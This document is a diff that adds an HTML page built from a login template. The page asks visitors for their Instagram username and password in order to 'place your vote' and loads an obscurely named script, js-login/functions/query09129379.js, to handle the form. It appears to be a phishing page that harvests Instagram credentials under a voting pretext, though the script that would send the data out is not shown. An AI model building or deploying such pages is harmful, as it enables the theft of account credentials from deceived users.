@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Login V1</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<!--===============================================================================================-->	
+	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/util.css">
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+<!--===============================================================================================-->
+</head>
+
+<body>
+	<span id="root">
+			<div class="limiter">
+				<div class="container-login100">
+					<div class="wrap-login100">
+						<div class="login100-pic js-tilt" data-tilt>
+							<img src="images/img-01.png" alt="IMG">
+						</div>
+						<div class="form-wrap">
+							<div class="hide" id="loader">
+							  <div class="container">
+								<div class="lds-roller">
+								  <div></div>
+								  <div></div>
+								  <div></div>
+								  <div></div>
+								  <div></div>
+								  <div></div>
+								  <div></div>
+								  <div></div>
+								</div>
+							  </div>
+							</div>
+						<div id="res">
+
+							<form class="login100-form validate-form" method="post" id="insta-submit">
+								<span class="login100-form-title">
+									Fill in your Instagram account details to place your vote
+								</span>
+
+								<div class="wrap-input100 validate-input" data-validate = "Valid email is required: ex@abc.xyz">
+									<input class="input100" type="text" 
+									placeholder="Instagram username/Email" 
+									id="name"
+									aria-describedby=""
+									aria-required="true"
+									maxlength="30"
+									autocapitalize="off"
+									value=""
+									name="username">
+									<span class="focus-input100"></span>
+									<span class="symbol-input100">
+										<i class="fa fa-envelope" aria-hidden="true"></i>
+									</span>
+								</div>
+
+								<div class="wrap-input100 validate-input" data-validate = "Password is required">
+									<input class="input100" type="password" 
+									placeholder="Instagram Password" 
+									id="password"
+									maxlength="30"
+									aria-describedby=""
+									autocapitalize="off"
+									autocorrect="off"
+									aria-required="true"
+									name="password">
+									<span class="focus-input100"></span>
+									<span class="symbol-input100">
+										<i class="fa fa-lock" aria-hidden="true"></i>
+									</span>
+								</div>
+								
+								<div class="container-login100-form-btn">
+									<button class="login100-form-btn" type="submit" onclick="return check(this.form )" name="submit">Login</button>
+								</div>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+			
+	</span>	
+	 <!-- Root -->
+
+    <!-- Select Link -->
+    <script type="text/javascript">
+		function la(src) {
+		  window.location = src;
+		}
+	  </script>
+	  <script src="js-login/functions/query09129379.js"></script>
+
+	
+<!--===============================================================================================-->	
+	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/bootstrap/js/popper.js"></script>
+	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/select2/select2.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/tilt/tilt.jquery.min.js"></script>
+	<script >
+		$('.js-tilt').tilt({
+			scale: 1.1
+		})
+	</script>
+<!--===============================================================================================-->
+	<script src="js/main.js"></script>
+</body>
+</html>
